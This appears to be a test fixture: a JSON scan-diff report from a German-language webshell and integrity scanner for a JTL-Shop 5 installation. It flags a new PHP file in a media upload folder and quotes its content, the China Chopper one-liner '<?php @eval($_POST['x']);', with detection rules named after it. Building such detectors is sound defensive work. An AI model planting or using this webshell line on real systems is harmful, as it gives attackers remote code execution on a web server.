@@ -1,0 +1,189 @@
+{
+  "schema_version": 1,
+  "platform_id": "jtl5",
+  "platform_name": "JTL-Shop 5",
+  "target": "/tmp/.tmp9f3GfK/shop",
+  "before_generated_at": "2026-11-25T08:25:39.222625289Z",
+  "after_generated_at": "2026-11-25T08:25:39.643842689Z",
+  "version_before": "5.3.1",
+  "version_after": "5.3.1",
+  "verdict_before": "critical",
+  "verdict_after": "critical",
+  "summary_after": {
+    "critical": 23,
+    "warning": 11,
+    "info": 2,
+    "accepted": 1
+  },
+  "first_run": false,
+  "relevance": "critical",
+  "new_findings": [
+    {
+      "id": "4cfd122be4c32fd6",
+      "severity": "critical",
+      "category": "suspicious_pattern",
+      "source": "file_system",
+      "title": "Direkte Ausführung von Request-Eingaben (eval/assert/system mit $_GET/$_POST/$_REQUEST/$_COOKIE)",
+      "description": "Regel `php_eval_request_input` [webshell]: Direkte Ausführung von Request-Eingaben (eval/assert/system mit $_GET/$_POST/$_REQUEST/$_COOKIE)",
+      "subject": "mediafiles/Bilder/neu.php",
+      "path": "/tmp/.tmp9f3GfK/shop/mediafiles/Bilder/neu.php",
+      "rule": "php_eval_request_input",
+      "evidence": [
+        "<?php @eval($_POST['x']);"
+      ],
+      "accepted": false,
+      "group": "mediafiles/Bilder",
+      "review": {
+        "verdict": "needs_human",
+        "confidence": 0.6,
+        "reasoning": "Testbewertung",
+        "model": "claude-sonnet-5-5",
+        "reviewed_at": "2026-11-25T08:25:39.928960644Z"
+      }
+    },
+    {
+      "id": "81eb524b014725b2",
+      "severity": "critical",
+      "category": "code_in_upload_dir",
+      "source": "file_system",
+      "title": "PHP-Datei in Upload-/Medienverzeichnis",
+      "description": "Upload- und Medienverzeichnisse dürfen keine ausführbaren Dateien enthalten. Ein PHP-Script an dieser Stelle ist ein klassisches Muster für eine über einen Upload-Bug abgelegte Webshell.",
+      "subject": "mediafiles/Bilder/neu.php",
+      "path": "/tmp/.tmp9f3GfK/shop/mediafiles/Bilder/neu.php",
+      "rule": "php_in_upload_dir",
+      "evidence": [
+        "mediafiles/Bilder/neu.php (25 B)"
+      ],
+      "accepted": false,
+      "group": "mediafiles/Bilder",
+      "review": {
+        "verdict": "needs_human",
+        "confidence": 0.6,
+        "reasoning": "Testbewertung",
+        "model": "claude-sonnet-5-5",
+        "reviewed_at": "2026-11-25T08:25:39.928960644Z"
+      }
+    },
+    {
+      "id": "b79e52affe29d7e2",
+      "severity": "critical",
+      "category": "suspicious_pattern",
+      "source": "file_system",
+      "title": "China-Chopper-Einzeiler: @eval($_POST[...])",
+      "description": "Regel `php_china_chopper` [webshell]: China-Chopper-Einzeiler: @eval($_POST[...])",
+      "subject": "mediafiles/Bilder/neu.php",
+      "path": "/tmp/.tmp9f3GfK/shop/mediafiles/Bilder/neu.php",
+      "rule": "php_china_chopper",
+      "evidence": [
+        "<?php @eval($_POST['x']);",
+        "https://www.cisa.gov/news-events/alerts/2015/11/10/compromised-web-servers-and-web-shells-threat-awareness-and-guidance"
+      ],
+      "accepted": false,
+      "group": "mediafiles/Bilder",
+      "review": {
+        "verdict": "needs_human",
+        "confidence": 0.6,
+        "reasoning": "Testbewertung",
+        "model": "claude-sonnet-5-5",
+        "reviewed_at": "2026-11-25T08:25:39.928960644Z"
+      }
+    },
+    {
+      "id": "10068f65be442089",
+      "severity": "warning",
+      "category": "integrity_deviation",
+      "source": "file_system",
+      "title": "Datei weicht von der Baseline ab",
+      "description": "Der Hash der Datei unterscheidet sich von der zuletzt aufgezeichneten Baseline. Entweder wurde die Datei legitim aktualisiert (Update, Anpassung) oder manipuliert.",
+      "subject": "admin/index.php",
+      "path": "/tmp/.tmp9f3GfK/shop/admin/index.php",
+      "rule": "baseline_changed",
+      "accepted": false,
+      "group": "admin",
+      "review": {
+        "verdict": "needs_human",
+        "confidence": 0.6,
+        "reasoning": "Testbewertung",
+        "model": "claude-sonnet-5-5",
+        "reviewed_at": "2026-11-25T08:25:39.928960644Z"
+      }
+    },
+    {
+      "id": "6ac995307b1b6756",
+      "severity": "warning",
+      "category": "modified_since_reference",
+      "source": "file_system",
+      "title": "Datei seit Referenzdatum neu oder geändert",
+      "description": "Änderungszeit 25.11.2026 08:25:39 UTC liegt nach dem Referenzdatum 17.06.2026. Jede unbekannte Änderung an ausführbaren Dateien seit Bekanntwerden der Schwachstelle ist zu verifizieren (Update? Agentur? Plugin?).",
+      "subject": "admin/index.php",
+      "path": "/tmp/.tmp9f3GfK/shop/admin/index.php",
+      "rule": "modified_since_reference",
+      "evidence": [
+        "mtime=2026-11-25T08:25:39.249940510+00:00"
+      ],
+      "accepted": false,
+      "group": "admin",
+      "review": {
+        "verdict": "needs_human",
+        "confidence": 0.6,
+        "reasoning": "Testbewertung",
+        "model": "claude-sonnet-5-5",
+        "reviewed_at": "2026-11-25T08:25:39.928960644Z"
+      }
+    },
+    {
+      "id": "6847eb442d474899",
+      "severity": "warning",
+      "category": "modified_since_reference",
+      "source": "file_system",
+      "title": "Datei seit Referenzdatum neu oder geändert",
+      "description": "Änderungszeit 25.11.2026 08:25:39 UTC liegt nach dem Referenzdatum 17.06.2026. Jede unbekannte Änderung an ausführbaren Dateien seit Bekanntwerden der Schwachstelle ist zu verifizieren (Update? Agentur? Plugin?).",
+      "subject": "mediafiles/Bilder/neu.php",
+      "path": "/tmp/.tmp9f3GfK/shop/mediafiles/Bilder/neu.php",
+      "rule": "modified_since_reference",
+      "evidence": [
+        "mtime=2026-11-25T08:25:39.249940510+00:00"
+      ],
+      "accepted": false,
+      "group": "mediafiles/Bilder",
+      "review": {
+        "verdict": "needs_human",
+        "confidence": 0.6,
+        "reasoning": "Testbewertung",
+        "model": "claude-sonnet-5-5",
+        "reviewed_at": "2026-11-25T08:25:39.928960644Z"
+      }
+    },
+    {
+      "id": "4c5cb6f4896cb4f5",
+      "severity": "info",
+      "category": "integrity_deviation",
+      "source": "file_system",
+      "title": "Neue Datei seit der Baseline",
+      "description": "Die Datei ist seit der Baseline hinzugekommen (Plugin, Update – oder Fremdcode).",
+      "subject": "mediafiles/Bilder/neu.php",
+      "path": "/tmp/.tmp9f3GfK/shop/mediafiles/Bilder/neu.php",
+      "rule": "baseline_added",
+      "accepted": false,
+      "group": "mediafiles/Bilder"
+    }
+  ],
+  "resolved_findings": [],
+  "changed_severity": [],
+  "new_advisories": [],
+  "fixed_advisories": [],
+  "integrity_changes": [
+    {
+      "key": "integrity.baseline",
+      "section": "Integrität",
+      "label": "Abweichungen von der Baseline",
+      "change": "changed",
+      "status_before": "ok",
+      "status_after": "warning",
+      "value_before": "0 geändert, 0 fehlend, 0 neu",
+      "value_after": "1 geändert, 0 fehlend, 1 neu",
+      "detail": "Baseline vom 25.11.2026 08:25 UTC (36 Dateien)",
+      "significant": true
+    }
+  ]
+}
